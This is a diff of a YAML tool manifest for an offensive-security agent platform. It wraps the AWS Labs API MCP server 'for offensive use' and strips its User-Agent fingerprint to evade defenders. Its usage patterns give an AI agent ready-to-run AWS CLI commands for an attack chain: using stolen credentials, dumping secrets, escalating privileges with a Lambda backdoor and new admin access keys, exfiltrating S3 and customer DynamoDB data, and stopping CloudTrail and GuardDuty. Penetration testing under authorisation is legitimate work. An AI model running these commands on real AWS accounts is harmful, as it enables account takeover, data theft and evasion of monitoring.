@@ -1,9 +1,15 @@
 name: aws
+kind: mcp
 version: "1.3"
-description: "Interactive AWS API client via awslabs aws-api-mcp-server (forked for offensive use). Translates AWS CLI command strings into boto3 API calls. Supports ALL AWS services — IAM, S3, Lambda, DynamoDB, SQS, STS, EC2, Secrets Manager, CloudTrail, and 200+ more. Batch mode (20 commands per call), all-region scanning, automatic pagination. User-Agent fingerprint stripped for OPSEC. Credentials via env vars. For IAM privilege escalation use pacu. For attack path analysis use cloudfox. For cloud security auditing use prowler."
+description: "AWS API client via AWS Labs' OFFICIAL MCP server `awslabs.aws-api-mcp-server` (PyPI v1.3.x, Apache-2.0). Thin wrapper: pip install + ~30-LOC Python that strips the awslabs User-Agent fingerprint (md/awslabs#mcp#aws-api-mcp-server#<version>) for OPSEC and disables telemetry (AWS_API_MCP_TELEMETRY=false). Default 2-tool surface: `call_aws` (primary — execute any AWS CLI command, single or batch up to 20, supports `--region *` for cross-region scans) and `suggest_aws_commands` (NL fallback — NOTE: hits AWS Labs HTTPS endpoint with query text, OPSEC-leaky, agent should prefer call_aws). Optional 3rd tool `get_execution_plan` unlocks if EXPERIMENTAL_AGENT_SCRIPTS=true. The agent's PRIMITIVE for AWS API access on cloud engagements — every other AWS-related tool (pacu/cloudfox/prowler/s3scanner) sits on top of the same boto3 chain conceptually but exposes narrower read-only or pre-canned surfaces; aws is the only one that supports arbitrary writes (privesc, persistence, exfil, defense evasion calls)."
+source: https://github.com/awslabs/mcp/tree/main/src/aws-api-mcp-server
 image: "ghcr.io/silicon-works/mcp-tools-aws:latest"
-image_size_mb: 400
+image_size_mb: 347
 timeout_seconds: 600
+idle_timeout_seconds: 1800
+
+service: true
+service_name: "aws"
 
 capabilities:
   - aws_api_access
@@ -11,6 +17,8 @@ capabilities:
   - s3_operations
   - lambda_operations
   - cloud_exploitation
+  - cross_region_scanning
+  - batch_api_calls
 
 phases:
   - reconnaissance
@@ -23,30 +31,46 @@ requirements:
   privileged: false
 
 resources:
-  memory_mb: 512
+  memory_mb: 1024
   cpu: 0.5
+
+allowed_env:
+  - AWS_ACCESS_KEY_ID
+  - AWS_SECRET_ACCESS_KEY
+  - AWS_SESSION_TOKEN
+  - AWS_REGION
+  - AWS_DEFAULT_REGION
+  - AWS_PROFILE
+  - AWS_API_MCP_PROFILE_NAME
+  - AWS_API_MCP_WORKING_DIR
+  - AWS_API_MCP_ALLOW_UNRESTRICTED_LOCAL_FILE_ACCESS
+  - READ_OPERATIONS_ONLY
+  - EXPERIMENTAL_AGENT_SCRIPTS
 
 routing:
   use_for:
-    - "execute any AWS CLI command against an AWS account"
-    - "enumerate IAM users, roles, policies, and permissions"
+    - "execute any AWS CLI command against an AWS account (single or batch up to 20)"
+    - "enumerate IAM users, roles, policies, permissions"
     - "list and access S3 buckets and objects"
     - "inspect and invoke Lambda functions"
     - "scan DynamoDB tables and query data"
     - "check STS identity (who am I?) with stolen credentials"
     - "access Secrets Manager and Parameter Store"
-    - "enumerate EC2 instances, security groups, and user data"
+    - "enumerate EC2 instances, security groups, user data"
     - "interact with SQS queues"
     - "disable CloudTrail logging (if authorized)"
+    - "cross-region asset enumeration via --region *"
   never_use_for:
-    - "cloud security auditing/compliance (use prowler)"
-    - "IAM privilege escalation analysis (use pacu — it has 21+ privesc modules)"
-    - "attack path analysis (use cloudfox — it does cross-service correlation)"
-    - "S3 bucket brute-force discovery (use s3scanner)"
+    - "cloud security auditing/compliance (use prowler — runs hundreds of CIS/NIST/PCI checks)"
+    - "IAM privilege escalation analysis (use pacu — has 21+ privesc modules pre-built)"
+    - "attack path analysis (use cloudfox — cross-service trust-chain correlation)"
+    - "S3 bucket brute-force discovery from outside an account (use s3scanner)"
     - "secret scanning in S3 contents (use trufflehog)"
+    - "natural-language command suggestion in OPSEC-sensitive engagements — suggest_aws_commands hits AWS Labs telemetry endpoint with query text (use call_aws with explicit commands instead)"
   triggers:
     - aws
     - AWS CLI
+    - boto3
     - iam
     - s3
     - lambda
@@ -55,6 +79,7 @@ routing:
     - sts
     - ec2
     - secrets manager
+    - parameter store
     - cloudtrail
     - AWS API
     - cloud
@@ -63,19 +88,238 @@ routing:
 
 see_also:
   - tool: pacu
-    reason: aws gives raw API access. pacu encodes exploitation knowledge — 21+ IAM privesc paths, persistence modules, evasion techniques. Use aws for manual enumeration, pacu for automated exploitation.
+    reason: "aws gives raw API access. pacu encodes exploitation knowledge — 21+ IAM privesc paths, persistence modules, evasion techniques. Use aws for manual enumeration + write ops, pacu for automated exploitation patterns."
   - tool: cloudfox
-    reason: aws makes individual API calls. cloudfox does cross-service attack path analysis (trust chains, role assumptions, env var secrets). Use cloudfox for situational awareness.
+    reason: "aws makes individual API calls. cloudfox does cross-service attack-path analysis (trust chains, role assumptions, env-var secrets in instance metadata). Use cloudfox for situational awareness, then aws to execute discovered attack paths."
   - tool: prowler
-    reason: Both interact with AWS APIs but prowler is read-only compliance auditing. aws allows read AND write operations for exploitation.
+    reason: "Both interact with AWS APIs but prowler is read-only compliance auditing across hundreds of CIS/NIST/PCI checks. aws allows read AND write operations for exploitation."
   - tool: s3scanner
-    reason: Use s3scanner to discover unknown S3 buckets by name. Use aws to interact with known/discovered buckets.
+    reason: "Use s3scanner to discover unknown S3 buckets by name fuzzing from outside the account. Use aws to interact with known/discovered buckets from inside the account."
   - tool: trufflehog
-    reason: Use trufflehog to scan S3 bucket contents for secrets. Use aws for general S3 operations.
+    reason: "Use trufflehog to scan S3 bucket contents (or git histories, filesystem dumps) for secrets. Use aws for general S3 operations like listing/copying."
+
+warnings:
+  - "The `suggest_aws_commands` tool hits a remote AWS Labs HTTPS endpoint with the agent's query text (verified vendor source 2026-05-11). Defenders won't see this in target's CloudTrail (it's not a target API call) but AWS Labs telemetry does. **For OPSEC-sensitive engagements: NEVER call suggest_aws_commands; always use call_aws with explicit commands.** There is no vendor env var to disable suggest_aws_commands as of v1.3.36; agent must self-discipline."
+  - "Vendor wraps every error in `result.content[0].text` with `isError: false` (NOT the standard MCP isError flag). Live-verified 2026-05-11: even fatal errors (no creds, invalid command) come back as success-shaped responses. **Agents must parse the JSON content for an `error` key, not check isError.**"
+  - "User-Agent fingerprint mitigation: vendor stamps `md/awslabs#mcp#aws-api-mcp-server#<version> cfg/ro#0 cfg/scripts#0` into boto3 user_agent_extra by default. Defender CloudTrail sees the awslabs marker on every API call. Our `mcp-server.py` patches the User-Agent to strip the awslabs prefix at startup — verify the patch still applies on vendor version bumps (cfg/ro and cfg/scripts markers may also need stripping if upstream changes that path)."
+  - "Credential leak risk: AWS creds typically arrive as env vars (AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + optional AWS_SESSION_TOKEN). With service:true, these are set ONCE at container start via opensploit's envOverrides and persist across calls — much safer than per-call argv passing (which would expose creds in `docker inspect` and process listings). Do NOT pass creds in cli_command argv (e.g., `aws s3 ls --aws-access-key-id ...`)."
+
+notes: |
+  ## Architecture
+
+  ```
+  opensploit ContainerManager (stdio MCP, service:true once per session)
+           │   docker run -i --rm
+           │     -e AWS_ACCESS_KEY_ID=... -e AWS_SECRET_ACCESS_KEY=...
+           │     -e AWS_SESSION_TOKEN=... -e AWS_REGION=us-east-1
+           │     -v ${sessionDir}:/session:rw
+           │     ghcr.io/silicon-works/mcp-tools-aws:latest
+           ▼
+  Container's CMD: python3 mcp-server.py (~33 LOC wrapper)
+           │  • set AWS_API_MCP_TELEMETRY=false (kill awslabs telemetry)
+           │  • set AWS_API_MCP_TRANSPORT=stdio
+           │  • monkey-patch boto3 User-Agent to strip "md/awslabs#mcp#aws-api-mcp-server#<version>"
+           │  • from awslabs.aws_api_mcp_server.server import main; main()
+           ▼
+  awslabs.aws-api-mcp-server v1.3.x (FastMCP v3.2.x)
+           │  serverInfo: name="AWS-API-MCP", version="<FastMCP framework version>"
+           │  Default tool surface (2):
+           │    • call_aws — execute AWS CLI command(s), single or batch up to 20
+           │    • suggest_aws_commands — NL fallback (OPSEC-leaky, see warnings)
+           │  Conditional 3rd tool (if EXPERIMENTAL_AGENT_SCRIPTS=true):
+           │    • get_execution_plan — pre-baked AWS workflow scripts
+           ▼
+  AWS API (boto3 + bundled awscli==1.45.x)
+           │  Reads creds via standard boto3 chain:
+           │  1. Env vars (AWS_ACCESS_KEY_ID/_SECRET/_SESSION_TOKEN)
+           │  2. ~/.aws/credentials + ~/.aws/config
+           │  3. EC2 instance metadata (IMDSv2)
+           │  4. ECS task role
+           ▼
+  Target AWS account (any service: IAM, S3, Lambda, EC2, Secrets, ...)
+
+  CloudTrail in target account logs every call with userIdentity, sourceIPAddress,
+  userAgent (awslabs prefix stripped, but Boto3/X.Y.Z Python/Y.Z still visible —
+  not Prowler-level identifiable but distinguishable from console use).
+  ```
+
+  ## Tool surface (2 default + 1 conditional)
+
+  ```
+  call_aws              (default, primary)         — Execute AWS CLI command(s), single or batch
+  suggest_aws_commands  (default, OPSEC-leaky)     — NL → command suggestions (calls AWS Labs HTTPS)
+  get_execution_plan    (conditional, off by default) — Pre-baked workflow scripts (EXPERIMENTAL_AGENT_SCRIPTS=true)
+  ```
+
+  Verified live 2026-05-11 against `ghcr.io/silicon-works/mcp-tools-aws:latest`:
+  tools/list returns exactly 2 tools (call_aws + suggest_aws_commands).
+  Server identifies as `AWS-API-MCP` v `3.2.4` (the FastMCP framework version,
+  not the underlying `awslabs.aws-api-mcp-server` package version which is 1.3.x).
+
+  ## Why a thin wrapper (no swap to retire)
+
+  `awslabs.aws-api-mcp-server` was always a vendor MCP — there is no custom 400+-LOC
+  reimplementation in this repo. Our `tools/aws/mcp-server.py` is 33 lines: env vars
+  + User-Agent patch + import-and-run vendor's main(). This was a `kind:mcp` (legacy
+  implicit) tool that just lacked the standardization layer (explicit kind, scenarios,
+  failure_signatures, smoke test) that mongodb/prowler got in May 2026 swaps and
+  playwright got in its May 8 standardization. This file IS that standardization.
+
+  ## Engagement-class fit
+
+  | Phase | What aws does for you |
+  |---|---|
+  | Identity discovery | `aws sts get-caller-identity`, `aws iam list-attached-role-policies`, `aws iam simulate-principal-policy` |
+  | Account enumeration | `aws ec2 describe-instances --region *`, `aws s3 ls`, `aws lambda list-functions`, `aws secretsmanager list-secrets`, `aws ssm describe-parameters` |
+  | Privilege escalation (write ops) | `aws iam create-access-key`, `aws iam update-assume-role-policy`, `aws lambda update-function-code` |
+  | Lateral movement | `aws sts assume-role`, `aws ssm send-command`, `aws ec2-instance-connect send-ssh-public-key` |
+  | Persistence | `aws iam create-login-profile`, `aws lambda create-function`, `aws events put-rule` |
+  | Data exfiltration | `aws s3 sync s3://bucket /local/`, `aws dynamodb scan`, `aws ec2 create-snapshot` |
+  | Defense evasion | `aws cloudtrail stop-logging`, `aws guardduty disable-organization-admin-account` |
+
+  None of pacu/cloudfox/prowler can do the write-side phases — those require `aws`.
 
 methods:
-  execute_aws_command:
-    description: "Execute any AWS CLI command via boto3. Accepts the full AWS CLI command string (e.g., 'aws sts get-caller-identity', 'aws s3 ls'). Supports batch mode with up to 20 commands per call."
-    when_to_use: "For any AWS API interaction — IAM enumeration, S3 access, Lambda inspection, DynamoDB queries, SQS interaction, and 200+ other AWS services. This is the swiss army knife for AWS pentesting."
-    params: {}
-    returns: {}
+  call_aws:
+    description: "Execute AWS CLI command(s), single or batch up to 20. Vendor source: awslabs/aws_api_mcp_server/server.py:183. Returns list[CallAWSResponse], each with `cli_command`, `response` (on success), or `error` (on failure). NOTE: failures come back as 200-OK responses with isError:false — parse content[0].text JSON and check for `error` key."
+    when_to_use: "PRIMARY tool. Use whenever you know the exact AWS CLI command. Always prefer over suggest_aws_commands (which is OPSEC-leaky). For cross-region scanning use `--region *` (vendor expands across all enabled regions). Batch mode (list of command strings) is up to 20 commands per call — useful for parallel enum across services or accounts."
+    params:
+      cli_command:
+        type: string
+        required: true
+        description: "EITHER a single AWS CLI command string (e.g., 'aws sts get-caller-identity') OR a JSON array of up to 20 command strings (e.g., ['aws s3 ls', 'aws iam list-users']). MUST start with 'aws'. Pipe operators, shell substitution, and redirects are FORBIDDEN by vendor — pure CLI args only. Use `--region *` for cross-region. Verified vendor source 2026-05-11: vendor's Pydantic schema accepts `str | list[str]`."
+      max_results:
+        type: integer
+        description: "Optional limit on the number of paginated results returned. Useful for sanity-checking before pulling full datasets (e.g., `aws s3api list-objects-v2 --bucket huge-bucket` with max_results=100 to peek). Default unlimited."
+
+  suggest_aws_commands:
+    description: "**OPSEC-LEAKY FALLBACK.** Suggest AWS CLI commands based on a natural-language query. Vendor source: awslabs/aws_api_mcp_server/server.py:89. **Sends the query text over HTTPS to an AWS Labs endpoint** (verified vendor source 2026-05-11 — calls `ENDPOINT_SUGGEST_AWS_COMMANDS` via requests.post). For OPSEC-sensitive engagements: never call this. Use only when (1) you cannot determine the exact AWS service or operation, (2) the request is exploratory and not against a sensitive target."
+    when_to_use: "DO NOT use against engagement targets. Only acceptable for exploratory work in personal/lab AWS accounts. Always prefer `call_aws` with an explicit command. Vendor's own description acknowledges this is a 'FALLBACK' tool."
+    params:
+      query:
+        type: string
+        required: true
+        description: "Natural-language description of what you want to do. Sent over HTTPS to AWS Labs telemetry endpoint."
+
+failure_signatures:
+  - signal: "No AWS credentials found. Please configure your AWS credentials"
+    error_class: "no_credentials"
+    remediation: "Container started without AWS_ACCESS_KEY_ID/_SECRET set. Set them via opensploit's envOverrides mechanism BEFORE the first call. With service:true the env is set once at container start and persists across calls — do NOT pass creds in cli_command argv (leaks via docker inspect). Verified live 2026-05-11."
+  - signal: "The provided CLI command is not an AWS command"
+    error_class: "non_aws_command"
+    remediation: "Vendor validates that cli_command starts with 'aws'. Common mistake: passing a bash command (e.g., 'ls /tmp') OR forgetting to prepend 'aws' (e.g., 'sts get-caller-identity'). Fix: every command MUST start with 'aws '. Verified live 2026-05-11."
+  - signal: "argument .*: expected one argument"
+    error_class: "argv_validation"
+    remediation: "Generic awscli argv parser error — usually missing arg value (e.g., 'aws s3 ls --bucket' without the bucket name). Fix the argv. Note: `aws --version` itself fails this way through the MCP wrapper (vendor expects a service positional arg). Verified live 2026-05-11."
+  - signal: "Number of batch commands exceeds the maximum limit of 20"
+    error_class: "batch_limit_exceeded"
+    remediation: "Vendor's MAX_BATCH_COMMANDS = 20 (verified vendor source config.py:189). Split the batch into chunks of 20."
+  - signal: "Unable to locate credentials"
+    error_class: "no_credentials_botocore"
+    remediation: "Boto3-side variant of the no-creds error (different code path than the wrapper-side check). Same fix: set AWS_ACCESS_KEY_ID/_SECRET via envOverrides."
+  - signal: "ExpiredToken|TokenRefreshRequired"
+    error_class: "expired_session_token"
+    remediation: "Temporary credentials (typically from sts:assume-role or instance metadata) have expired. Either re-acquire via sts:assume-role with the underlying long-term creds, or re-extract fresh creds from the target. Update AWS_SESSION_TOKEN env via envOverrides — service:true container picks up new env on next call."
+  - signal: "AccessDenied|UnauthorizedOperation"
+    error_class: "iam_permission_denied"
+    remediation: "Current principal lacks the required IAM permission for this call. (1) Run `aws iam simulate-principal-policy` to check what's actually allowed. (2) Try `aws sts get-caller-identity` to verify which principal the creds resolve to (might be a less-privileged role than expected). (3) Check for SCP / permission-boundary restrictions if the IAM policy looks permissive."
+  - signal: "ThrottlingException|RequestLimitExceeded|TooManyRequestsException"
+    error_class: "api_throttle"
+    remediation: "AWS API throttle. Back off + retry with exponential delay. Common when fan-out enumeration runs --region * across many services in batch mode. Reduce parallelism or insert delays between batches."
+  - signal: "Invalid endpoint:.*for region"
+    error_class: "service_unavailable_in_region"
+    remediation: "The service isn't available in the target region (e.g., AWS GovCloud regions don't have all services). Re-issue with --region us-east-1 (or another commercial region) if account scope allows."
+
+gotchas:
+  - "**`isError: false` even on failure.** Vendor wraps every result (success or error) in result.content[0].text as a JSON list of {cli_command, response|error}. Standard MCP isError flag is ALWAYS false. Agent must parse the content JSON and check for `error` keys. Verified live 2026-05-11."
+  - "**Default 2-tool surface, conditional 3rd.** call_aws + suggest_aws_commands always present. get_execution_plan only appears if EXPERIMENTAL_AGENT_SCRIPTS=true. Our entrypoint does NOT enable it (the pre-baked scripts are business-task workflows, not offensive). To enable for an engagement that wants pre-baked plans: add EXPERIMENTAL_AGENT_SCRIPTS=true via envOverrides + restart container."
+  - "**`suggest_aws_commands` calls home.** Verified vendor source 2026-05-11: hits AWS Labs HTTPS endpoint (`ENDPOINT_SUGGEST_AWS_COMMANDS`) with raw query text. NO vendor env to disable. Agent must self-discipline: never call this against engagement targets. Older versions of our wrapper set `AWS_API_MCP_ALLOW_SUGGEST=false` thinking it disabled this — that env var DOES NOT EXIST in vendor source (verified). Removed from Dockerfile."
+  - "**Cross-region wildcard.** `--region *` is a VENDOR EXTENSION (not standard awscli) — vendor expands it server-side into one call per enabled region in the account. Use this instead of explicit batch loops over regions; vendor's expansion is more efficient + automatically handles new regions."
+  - "**Batch is 20 max.** MAX_BATCH_COMMANDS=20 (vendor config.py:189). For larger fan-outs, chunk client-side."
+  - "**Default region us-east-1.** If no AWS_REGION/AWS_DEFAULT_REGION env is set + cli_command has no --region, vendor defaults to us-east-1. Many real engagements have resources in other regions — set AWS_REGION via envOverrides to your target's primary region OR always include --region in cli_command."
+  - "**Working dir at /tmp/aws-api-mcp/workdir by default.** Vendor reads/writes files (e.g., for `aws s3 cp` operations targeting local paths) here. To direct outputs into the session dir for cross-tool access, set AWS_API_MCP_WORKING_DIR=/session/aws-work via envOverrides. Live-verified 2026-05-11: log line `CWD: /tmp/aws-api-mcp/workdir` appears at startup."
+  - "**No vendor method to set credentials.** AWS creds come from the standard boto3 chain — env vars > ~/.aws/credentials > IMDSv2 > ECS task role. With service:true container persistence, env vars (AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + optional AWS_SESSION_TOKEN) set once at container start are the cleanest path. Mounted ~/.aws/credentials inside /session also works."
+  - "**OPSEC: Boto3 user-agent still visible in CloudTrail.** Our wrapper strips the awslabs MCP fingerprint, but boto3's own UA (Boto3/1.41.x Python/3.13 Linux/...) remains. Defenders watching CloudTrail userAgent for non-console patterns can still distinguish API-driven activity from console clicks. There is no way to make boto3 calls indistinguishable from console — only to make them indistinguishable from legitimate boto3 clients."
+  - "**READ-ONLY mode toggle.** Set READ_OPERATIONS_ONLY=true env (vendor's env name, NOT prefixed with AWS_API_MCP_) to make vendor reject write operations. For pure recon engagements where you want to be sure not to accidentally modify state. Annotations on call_aws also flip readOnlyHint=True/destructiveHint=False when this is set."
+
+usage_patterns:
+  - name: "phase 1 — identity & permission discovery"
+    description: "After credentials drop, immediately discover who you are + what you can do. Single batch call."
+    example: |
+      call_aws({
+        cli_command: [
+          "aws sts get-caller-identity",
+          "aws iam get-user",
+          "aws iam list-attached-user-policies --user-name <user-from-prev>",
+          "aws iam list-user-policies --user-name <user-from-prev>",
+          "aws iam simulate-principal-policy --policy-source-arn <arn> --action-names iam:* s3:* lambda:*"
+        ]
+      })
+
+  - name: "phase 2 — cross-region asset enumeration (batched)"
+    description: "Enumerate the visible attack surface across all regions in one batch call. Use --region * to fan out per-region automatically."
+    example: |
+      call_aws({
+        cli_command: [
+          "aws ec2 describe-instances --region *",
+          "aws s3 ls",
+          "aws lambda list-functions --region *",
+          "aws iam list-users",
+          "aws iam list-roles",
+          "aws secretsmanager list-secrets --region *",
+          "aws ssm describe-parameters --region *",
+          "aws rds describe-db-instances --region *",
+          "aws dynamodb list-tables --region *"
+        ],
+        max_results: 100
+      })
+
+  - name: "phase 3 — secrets sweep"
+    description: "After enumeration, dump every secret you can read. Batch all known secret names at once."
+    example: |
+      call_aws({
+        cli_command: [
+          "aws secretsmanager get-secret-value --secret-id <name1>",
+          "aws secretsmanager get-secret-value --secret-id <name2>",
+          "aws ssm get-parameter --name <param1> --with-decryption",
+          "aws ssm get-parameter --name <param2> --with-decryption"
+        ]
+      })
+
+  - name: "phase 4 — privilege escalation (write ops)"
+    description: "Common AWS privesc primitives — pick based on what `iam simulate-principal-policy` confirmed in phase 1. Each is a SINGLE call (one shot, not batched, so audit trail is cleaner if remediation is needed)."
+    example: |
+      // iam:CreateAccessKey on a higher-privilege user
+      call_aws({cli_command: "aws iam create-access-key --user-name target_admin"})
+      // iam:UpdateAssumeRolePolicy on an admin role to add yourself as trusted principal
+      call_aws({cli_command: "aws iam update-assume-role-policy --role-name AdminRole --policy-document file:///session/poc/assume-role-policy.json"})
+      // lambda:UpdateFunctionCode on a function that runs as admin role
+      call_aws({cli_command: "aws lambda update-function-code --function-name vulnerable-fn --zip-file fileb:///session/poc/backdoor.zip"})
+
+  - name: "phase 5 — data exfiltration"
+    description: "Pull the data — S3 sync, DynamoDB scan, EBS snapshot for cross-account copy. exfiltration outputs go under /session/exfil/ for downstream analysis tools."
+    example: |
+      call_aws({
+        cli_command: [
+          "aws s3 sync s3://target-data-bucket /session/exfil/s3-bucket/",
+          "aws dynamodb scan --table-name customer_data --output json"
+        ]
+      })
+      // Then trigger snapshot copy cross-account (separate call to set --region)
+      call_aws({cli_command: "aws ec2 create-snapshot --volume-id vol-xyz --description 'maintenance' --region us-east-1"})
+
+  - name: "phase 6 — defense evasion / cleanup"
+    description: "Suppress detection if the engagement scope authorizes it. NOTE: stopping CloudTrail is itself logged as `StopLogging` event — defenders see this. Disabling GuardDuty leaves an audit trail. Only useful as part of an exfiltration sprint where alerting delay matters."
+    example: |
+      call_aws({cli_command: "aws cloudtrail stop-logging --name <trail-name>"})
+      call_aws({cli_command: "aws guardduty disable-organization-admin-account --admin-account-id <account>"})
+      call_aws({cli_command: "aws config delete-config-rule --config-rule-name <rule>"})
+
+  - name: "post-engagement — credential validation in lab"
+    description: "Quick sanity check that recovered creds work + identify what they can access, against your OWN lab account first before turning them on the engagement target."
+    example: |
+      // Set env first via envOverrides:
+      // AWS_ACCESS_KEY_ID=<recovered>, AWS_SECRET_ACCESS_KEY=<recovered>
+      call_aws({cli_command: "aws sts get-caller-identity"})
+      // If that succeeds — confirm region
+      call_aws({cli_command: "aws ec2 describe-availability-zones"})
